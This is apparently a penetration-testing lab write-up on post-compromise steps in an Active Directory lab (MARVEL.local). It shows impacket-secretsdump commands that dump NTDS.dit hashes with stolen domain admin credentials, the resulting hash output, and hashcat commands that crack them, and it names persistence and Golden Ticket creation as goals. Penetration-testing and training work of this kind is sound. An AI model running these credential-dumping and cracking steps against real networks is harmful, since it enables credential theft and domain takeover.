## We own the domain now what?  
In the event we manage to compromise Domain and there is still time in the engagement, we will continue to provide as much value to the client as possible.  

1. Dump NTDS.dit and crack passwords.
2. Enumerate further shares for sensitive information such as PII data and other findings so that this can be reported.
3. Create persistence in the event our main access is lost and also remember to remove rouge Domain Admin accounts.
4. Test for detections espicially for DA account creations. A good environment should detect these account creations.
5. Creating a Golden Ticket.

---

## 🚩 Dumping the NTDS.dit

### What is NTDS.dit?  
An extremely critical and highly sensitive database used to store AD data within Active Directory / Domain Controllers:
* user information
* gorup information
* security dscriptors
* password hashes

Using a **known domain admin account** we could use secretsdump and its switch of **-just-dc-ntlm** to dump out the DCs NTDS file. A successful Domain dump will contain a range of information from: SAM, credentials, domains, krbtgt, hashes, local account users, pc logins, and other accounts that may of been created from ipv6 / relayx + mitm6 relay attack.  

example:

    impacket-secretsdump / secretsdump 'impacket-secretsdump MARVEL.local/pparker:'Password1'@192.168.64.139 -just-dc-ntlm

using our malicious domain admin account hawkeye against the DC, we succesfully dump the local SAM and more importantly NTDS.dit file. From the dump we also see 'kerberos keys' and also the krbtgt which could be later leveraged in a kerberos ticket attack.

    impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138

![image](https://github.com/user-attachments/assets/dfe18c4b-7172-4012-8155-1c74bbd42f97)

Using -just-dc-ntlm with secretsdump will only dump out the NTDS.dit, filtering out the other data as the name implies.  

    root@kali:/home/kali# impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138 -just-dc-ntlm
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2617733570dcba888a76e40359f8a359:::
    MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
    MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
    MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
    MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
    avrrDOsNBw:1109:aad3b435b51404eeaad3b435b51404ee:253a38577fe79301cf439d788dfa3850:::
    hawkeye:1110:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
    HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:86757f6579150e5ef1901687a33b627b:::
    THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:2338c61f1a4137c16acab764b8fe5022:::
    SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:1d86510b8589eccf45424b657db6ab52:::
    [*] Cleaning up... 
    root@kali:/home/kali# 

Now that we have the NTLM hashes dumped out from the NTDS.dit, we should filter out the NT portions of the hashes in excel, place it in a .txt file and have it cracked with -m of 1000 (given they are just ntlm) using hashcat. With all the cracked passwords, we can place them back into excel to see the passwords to accounts and also for final reporting.  

![image](https://github.com/user-attachments/assets/bd6014ac-0ea6-472c-b1fb-27290f32b313)

    hashcat -m 1000 ntds111.txt 
    once finished
    hashcat -m 1000 ntds111.txt --show

![image](https://github.com/user-attachments/assets/8b8b4bfb-821c-449f-9edc-f909ce359101)

We can now apply the cracked passwords back to the excel and match the cracked passwords with the hashes through using =vlookup magic or bash script.   

### Note:  
ignore PC passwords, they are typically not going to be cracked and have low value in this scenario.

